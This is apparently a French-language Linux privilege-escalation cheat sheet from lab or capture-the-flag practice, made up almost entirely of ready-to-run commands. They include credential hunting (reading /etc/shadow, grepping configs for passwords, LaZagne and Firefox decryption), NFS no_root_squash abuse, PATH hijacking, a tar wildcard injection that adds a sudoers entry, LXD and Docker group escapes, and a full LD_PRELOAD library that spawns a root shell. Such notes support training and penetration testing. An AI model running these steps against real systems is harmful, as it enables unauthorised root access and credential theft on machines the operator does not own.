
# Enumération

LinEnum.sh
https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh

Linux exploit suggester 2
https://github.com/jondonas/linux-exploit-suggester-2

```
hostname
/etc/issue
ps aux | grep root
ps au
ls -la /home/user
ls -l ~/.ssh
history
sudo -l
ifconfig
netstat
grep "CRON" /var/log/syslog
last
/etc/passwd
/etc/shadow
ls -la /etc/cron*
lsblk
find / -user test 2>/dev/null
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"
find / -perm -u=s 2>/dev/null
find / -name *.sh 2>/dev/null | xargs cat | grep "test"
apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list
cat /etc/os-release
env
uname -a
lscpu
cat /etc/shells
df -h
cat /etc/hosts
sudo -V
find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null
find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
id
getcap -r / 2>/dev/null
showmount -e 10.129.2.12
./pspy64 -pf -i 1000

for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done

for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done

for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done

for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done

ls -l .mozilla/firefox/ | grep default 
# dechiffrer avec firefox_decrypt.py

sudo python laZagne.py all

sudo cat /etc/security/opasswd
```

# NFS

**Machine victime :**
```
cat /etc/exports
```
- Vérifier "no_root_squash"

**Machine attaquante :**
```
showmount -e <MACHINE_IP>
mkdir /tmp/sharefolder
sudo mount -o rw <MCHINE_IP>:/sharedfolder /tmp/sharefolder
```

# Suid / sudo / capabilities ...

https://gtfobins.github.io/

# PSPY

https://github.com/DominicBreuker/pspy

Liste le processus sans être root (voir cronjob etc)

# Path

```
echo $PATH
cd tmp
echo "chmod u+s /bin/bash" > ls
chmod +x ls
export PATH=/tmp:$PATH
```

# Wildcard

```
echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
echo "" > "--checkpoint-action=exec=sh root.sh"
echo "" > --checkpoint=1
```

# Groupe
## Lxd

```
unzip alpine.zip 
lxd init
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
lxc init alpine r00t -c security.privileged=true
lxc config device add r00t host-root disk source=/ path=/mnt/root recursive=true
lxc start r00t
lxc exec r00t /bin/sh
```

## Docker

```
docker run -v /root:/mnt -it ubuntu
```

## Disque

```
debugfs
```

# LD_PRELOAD

Il faut avoir les droits pour redémarrer un service, par exemple avec sudo -l.
Exemple pour openssl :

```
sudo -l
--> (root) NOPASSWD: /usr/bin/openssl

ldd /usr/bin/openssl
	linux-vdso.so.1 (0x00007ffe1f68d000)
	libssl.so.1.1 => /usr/lib/x86_64-linux-gnu/libssl.so.1.1 (0x00007fb2df83a000)
	libcrypto.so.1.1 => /usr/lib/x86_64-linux-gnu/libcrypto.so.1.1     (0x00007fb2df36f000)
	libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007fb2df150000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb2ded5f000)
	libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fb2deb5b000)
	/lib64/ld-linux-x86-64.so.2 (0x00007fb2dfd7a000)
```

Compiler la bibliothèque suivante :
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

```
gcc -fPIC -shared -o root.so root.c -nostartfiles
```

Redémarrer le service :
```
sudo LD_PRELOAD=/tmp/root.so /usr/bin/openssl restart
# bien mettre le chemin en entier